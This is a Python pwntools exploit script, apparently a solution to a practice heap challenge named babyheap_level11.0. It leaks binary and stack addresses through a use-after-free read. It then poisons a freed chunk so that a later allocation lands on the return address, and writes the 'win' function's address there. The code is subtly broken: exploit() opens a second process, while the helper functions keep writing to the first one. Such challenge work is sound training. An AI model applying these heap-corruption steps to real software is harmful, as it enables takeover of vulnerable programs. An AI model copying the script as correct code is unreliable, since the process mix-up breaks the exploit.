from pwn import *

p = process("/challenge/babyheap_level11.0")
# binary ELF object to interact with the binary
binary = ELF("/challenge/babyheap_level11.0")

def malloc_to_1(loc:bytes):
    '''Prepare the heap so that the location can be overwritten'''
    # Allocate two chunks and free them
    p.sendline(b'malloc')  # Command to allocate memory
    p.sendline(b'0')  # Index of the first chunk
    p.sendline(b'200')  # Size of the first chunk
    p.sendline(b'malloc')  # Command to allocate memory
    p.sendline(b'1')  # Index of the second chunk
    p.sendline(b'200')  # Size of the second chunk
    p.sendline(b'free')  # Command to free memory
    p.sendline(b'0')  # Index of the first chunk
    p.sendline(b'free')  # Command to free memory
    p.sendline(b'1')  # Index of the second chunk

    # Overwrite location with the address
    p.sendline(b'scanf')  # Command to scan input
    p.sendline(b'1')  # Index where the address will be written
    p.recv()  # Receive response
    p.sendline(loc)  # Send the address to overwrite
    p.sendline(b'malloc')  # Command to allocate memory
    p.sendline(b'2')  # Index of the third chunk
    p.sendline(b'200')  # Size of the third chunk
    p.sendline(b'malloc')  # Command to allocate memory
    p.sendline(b'1')  # Index of the second chunk
    p.sendline(b'200')  # Size of the second chunk

def scanf_to_pos(buf:bytes, pos:bytes):
    '''Write data to a specific position'''
    p.sendline(b'scanf')  # Command to scan input
    p.sendline(pos)  # Position where the data will be written
    p.sendline(buf)  # Data to write
    p.recv()  # Receive response

def exploit():
    #--------Setup--------#
    # Start process
    p = process("/challenge/babyheap_level11.0")
    
    # Initial malloc and free to setup for leaking addresses
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'100')
    p.sendline(b'free')
    p.sendline(b'0')

    # Leak binary address
    p.sendline(b'echo')
    p.sendline(b'0')
    p.sendline(b'112')
    p.recvuntil(b'Data: ')
    bin_echo = p.recvuntil(b'\n')[:-1]
    binary_base = u64(bin_echo) - binary.sym['bin_echo']
    binary.address = binary_base
    print(p64(binary.address))

    # Leak stack address
    p.sendline(b'echo')
    p.sendline(b'0')
    p.sendline(b'120')
    p.recvuntil(b'Data: ')
    stack_leak = p.recvuntil(b'\n')[:-1]
    ret_addr = u64(stack_leak) + 374
    print(p64(ret_addr))

    # Execute the payload
    malloc_to_1(p64(ret_addr))
    scanf_to_pos(p64(binary.sym.win), b'1')
    p.sendline(b'quit')

    p.interactive()

if __name__ == "__main__":
    exploit()
